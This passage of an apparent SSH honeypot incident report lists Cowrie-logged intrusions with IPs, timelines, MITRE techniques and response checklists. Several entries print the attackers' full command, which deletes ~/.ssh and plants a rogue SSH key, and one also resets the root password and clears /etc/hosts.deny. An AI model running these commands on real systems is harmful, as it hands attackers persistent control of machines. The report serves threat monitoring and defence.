| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:56:00` | `cowrie.session.connect` |
| `2026-04-15 07:56:00` | `cowrie.client.version` |
| `2026-04-15 07:56:00` | `cowrie.client.kex` |
| `2026-04-15 07:56:01` | `cowrie.login.success` |
| `2026-04-15 07:56:01` | `cowrie.session.params` |
| `2026-04-15 07:56:01` | `cowrie.command.input` |
| `2026-04-15 07:56:01` | `cowrie.command.failed` |
| `2026-04-15 07:56:02` | `cowrie.log.closed` |
| `2026-04-15 07:56:02` | `cowrie.session.params` |
| `2026-04-15 07:56:02` | `cowrie.command.input` |
| `2026-04-15 07:56:02` | `cowrie.session.file_download` |
| `2026-04-15 07:56:02` | `cowrie.log.closed` |
| `2026-04-15 07:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f79a06fed36

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 07:56 |
| **Last Seen** | 2026-04-15 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:56:05` | `cowrie.session.connect` |
| `2026-04-15 07:56:05` | `cowrie.client.version` |
| `2026-04-15 07:56:05` | `cowrie.client.kex` |
| `2026-04-15 07:56:06` | `cowrie.login.success` |
| `2026-04-15 07:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bf3117fbfbb

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 07:57 |
| **Last Seen** | 2026-04-15 07:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:57:41` | `cowrie.session.connect` |
| `2026-04-15 07:57:41` | `cowrie.client.version` |
| `2026-04-15 07:57:41` | `cowrie.client.kex` |
| `2026-04-15 07:57:42` | `cowrie.login.success` |
| `2026-04-15 07:57:42` | `cowrie.session.params` |
| `2026-04-15 07:57:42` | `cowrie.command.input` |
| `2026-04-15 07:57:42` | `cowrie.command.failed` |
| `2026-04-15 07:57:43` | `cowrie.log.closed` |
| `2026-04-15 07:57:43` | `cowrie.session.params` |
| `2026-04-15 07:57:43` | `cowrie.command.input` |
| `2026-04-15 07:57:43` | `cowrie.session.file_download` |
| `2026-04-15 07:57:43` | `cowrie.log.closed` |
| `2026-04-15 07:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2b02a36eba4

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 07:57 |
| **Last Seen** | 2026-04-15 07:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:57:46` | `cowrie.session.connect` |
| `2026-04-15 07:57:46` | `cowrie.client.version` |
| `2026-04-15 07:57:46` | `cowrie.client.kex` |
| `2026-04-15 07:57:47` | `cowrie.login.success` |
| `2026-04-15 07:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5605292a20c4

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:59 |
| **Last Seen** | 2026-04-15 07:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:59:09` | `cowrie.session.connect` |
| `2026-04-15 07:59:09` | `cowrie.client.version` |
| `2026-04-15 07:59:09` | `cowrie.client.kex` |
| `2026-04-15 07:59:10` | `cowrie.login.success` |
| `2026-04-15 07:59:10` | `cowrie.session.params` |
| `2026-04-15 07:59:10` | `cowrie.command.input` |
| `2026-04-15 07:59:10` | `cowrie.command.failed` |
| `2026-04-15 07:59:10` | `cowrie.log.closed` |
| `2026-04-15 07:59:10` | `cowrie.session.params` |
| `2026-04-15 07:59:10` | `cowrie.command.input` |
| `2026-04-15 07:59:11` | `cowrie.session.file_download` |
| `2026-04-15 07:59:11` | `cowrie.log.closed` |
| `2026-04-15 07:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80da71db6257

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 07:59 |
| **Last Seen** | 2026-04-15 07:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:59:13` | `cowrie.session.connect` |
| `2026-04-15 07:59:13` | `cowrie.client.version` |
| `2026-04-15 07:59:13` | `cowrie.client.kex` |
| `2026-04-15 07:59:13` | `cowrie.login.success` |
| `2026-04-15 07:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62bd808c9ff3

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 07:59 |
| **Last Seen** | 2026-04-15 07:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:59:22` | `cowrie.session.connect` |
| `2026-04-15 07:59:22` | `cowrie.client.version` |
| `2026-04-15 07:59:22` | `cowrie.client.kex` |
| `2026-04-15 07:59:23` | `cowrie.login.success` |
| `2026-04-15 07:59:23` | `cowrie.session.params` |
| `2026-04-15 07:59:23` | `cowrie.command.input` |
| `2026-04-15 07:59:23` | `cowrie.command.failed` |
| `2026-04-15 07:59:23` | `cowrie.log.closed` |
| `2026-04-15 07:59:24` | `cowrie.session.params` |
| `2026-04-15 07:59:24` | `cowrie.command.input` |
| `2026-04-15 07:59:24` | `cowrie.session.file_download` |
| `2026-04-15 07:59:24` | `cowrie.log.closed` |
| `2026-04-15 07:59:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59b00a6ef16c

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 07:59 |
| **Last Seen** | 2026-04-15 07:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:59:26` | `cowrie.session.connect` |
| `2026-04-15 07:59:26` | `cowrie.client.version` |
| `2026-04-15 07:59:26` | `cowrie.client.kex` |
| `2026-04-15 07:59:27` | `cowrie.login.success` |
| `2026-04-15 07:59:27` | `cowrie.session.params` |
| `2026-04-15 07:59:27` | `cowrie.command.input` |
| `2026-04-15 07:59:27` | `cowrie.command.failed` |
| `2026-04-15 07:59:28` | `cowrie.log.closed` |
| `2026-04-15 07:59:28` | `cowrie.session.params` |
| `2026-04-15 07:59:28` | `cowrie.command.input` |
| `2026-04-15 07:59:29` | `cowrie.session.file_download` |
| `2026-04-15 07:59:29` | `cowrie.log.closed` |
| `2026-04-15 07:59:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a38cca275009

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-15 07:59 |
| **Last Seen** | 2026-04-15 07:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:59:26` | `cowrie.session.connect` |
| `2026-04-15 07:59:26` | `cowrie.client.version` |
| `2026-04-15 07:59:26` | `cowrie.client.kex` |
| `2026-04-15 07:59:27` | `cowrie.login.success` |
| `2026-04-15 07:59:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8270cd3f8d89

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 07:59 |
| **Last Seen** | 2026-04-15 07:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 07:59:31` | `cowrie.session.connect` |
| `2026-04-15 07:59:31` | `cowrie.client.version` |
| `2026-04-15 07:59:31` | `cowrie.client.kex` |
| `2026-04-15 07:59:32` | `cowrie.login.success` |
| `2026-04-15 07:59:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66cd483acf27

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 08:01 |
| **Last Seen** | 2026-04-15 08:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:01:09` | `cowrie.session.connect` |
| `2026-04-15 08:01:09` | `cowrie.client.version` |
| `2026-04-15 08:01:09` | `cowrie.client.kex` |
| `2026-04-15 08:01:10` | `cowrie.login.success` |
| `2026-04-15 08:01:11` | `cowrie.session.params` |
| `2026-04-15 08:01:11` | `cowrie.command.input` |
| `2026-04-15 08:01:11` | `cowrie.command.failed` |
| `2026-04-15 08:01:11` | `cowrie.log.closed` |
| `2026-04-15 08:01:12` | `cowrie.session.params` |
| `2026-04-15 08:01:12` | `cowrie.command.input` |
| `2026-04-15 08:01:12` | `cowrie.session.file_download` |
| `2026-04-15 08:01:12` | `cowrie.log.closed` |
| `2026-04-15 08:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c666b1b82224

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-04-15 08:01 |
| **Last Seen** | 2026-04-15 08:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:01:15` | `cowrie.session.connect` |
| `2026-04-15 08:01:15` | `cowrie.client.version` |
| `2026-04-15 08:01:15` | `cowrie.client.kex` |
| `2026-04-15 08:01:16` | `cowrie.login.success` |
| `2026-04-15 08:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-413c51b3e66d

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 08:02 |
| **Last Seen** | 2026-04-15 08:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:02:03` | `cowrie.session.connect` |
| `2026-04-15 08:02:03` | `cowrie.client.version` |
| `2026-04-15 08:02:03` | `cowrie.client.kex` |
| `2026-04-15 08:02:03` | `cowrie.login.success` |
| `2026-04-15 08:02:04` | `cowrie.session.params` |
| `2026-04-15 08:02:04` | `cowrie.command.input` |
| `2026-04-15 08:02:04` | `cowrie.command.failed` |
| `2026-04-15 08:02:04` | `cowrie.log.closed` |
| `2026-04-15 08:02:04` | `cowrie.session.params` |
| `2026-04-15 08:02:04` | `cowrie.command.input` |
| `2026-04-15 08:02:04` | `cowrie.session.file_download` |
| `2026-04-15 08:02:04` | `cowrie.log.closed` |
| `2026-04-15 08:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9858ea9f466e

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 08:02 |
| **Last Seen** | 2026-04-15 08:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:02:06` | `cowrie.session.connect` |
| `2026-04-15 08:02:06` | `cowrie.client.version` |
| `2026-04-15 08:02:07` | `cowrie.client.kex` |
| `2026-04-15 08:02:07` | `cowrie.login.success` |
| `2026-04-15 08:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83b92e1f77c3

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 08:05 |
| **Last Seen** | 2026-04-15 08:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:05:05` | `cowrie.session.connect` |
| `2026-04-15 08:05:05` | `cowrie.client.version` |
| `2026-04-15 08:05:05` | `cowrie.client.kex` |
| `2026-04-15 08:05:06` | `cowrie.login.success` |
| `2026-04-15 08:05:06` | `cowrie.session.params` |
| `2026-04-15 08:05:06` | `cowrie.command.input` |
| `2026-04-15 08:05:06` | `cowrie.command.failed` |
| `2026-04-15 08:05:06` | `cowrie.log.closed` |
| `2026-04-15 08:05:07` | `cowrie.session.params` |
| `2026-04-15 08:05:07` | `cowrie.command.input` |
| `2026-04-15 08:05:07` | `cowrie.session.file_download` |
| `2026-04-15 08:05:07` | `cowrie.log.closed` |
| `2026-04-15 08:05:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fb7a02f5c74

| Field | Detail |
|---|---|
| **Source IP** | `93.39.209[.]147` |
| **First Seen** | 2026-04-15 08:05 |
| **Last Seen** | 2026-04-15 08:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:05:09` | `cowrie.session.connect` |
| `2026-04-15 08:05:09` | `cowrie.client.version` |
| `2026-04-15 08:05:09` | `cowrie.client.kex` |
| `2026-04-15 08:05:10` | `cowrie.login.success` |
| `2026-04-15 08:05:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.39.209[.]147` to AbuseIPDB if not already reported
- [ ] Block `93.39.209[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0f64bdb5279

| Field | Detail |
|---|---|
| **Source IP** | `144.48.243[.]18` |
| **First Seen** | 2026-04-15 08:05 |
| **Last Seen** | 2026-04-15 08:05 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:xLIGdn6Kif7j"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 08:05:15` | `cowrie.session.connect` |
| `2026-04-15 08:05:15` | `cowrie.client.version` |
| `2026-04-15 08:05:15` | `cowrie.client.kex` |
| `2026-04-15 08:05:15` | `cowrie.login.success` |
| `2026-04-15 08:05:16` | `cowrie.session.params` |
| `2026-04-15 08:05:16` | `cowrie.command.input` |
| `2026-04-15 08:05:16` | `cowrie.command.failed` |
| `2026-04-15 08:05:16` | `cowrie.log.closed` |
| `2026-04-15 08:05:16` | `cowrie.session.params` |
| `2026-04-15 08:05:16` | `cowrie.command.input` |
| `2026-04-15 08:05:16` | `cowrie.session.file_download` |
| `2026-04-15 08:05:16` | `cowrie.log.closed` |
| `2026-04-15 08:05:24` | `cowrie.session.params` |
| `2026-04-15 08:05:24` | `cowrie.command.input` |
| `2026-04-15 08:05:24` | `cowrie.log.closed` |
| `2026-04-15 08:05:24` | `cowrie.session.params` |
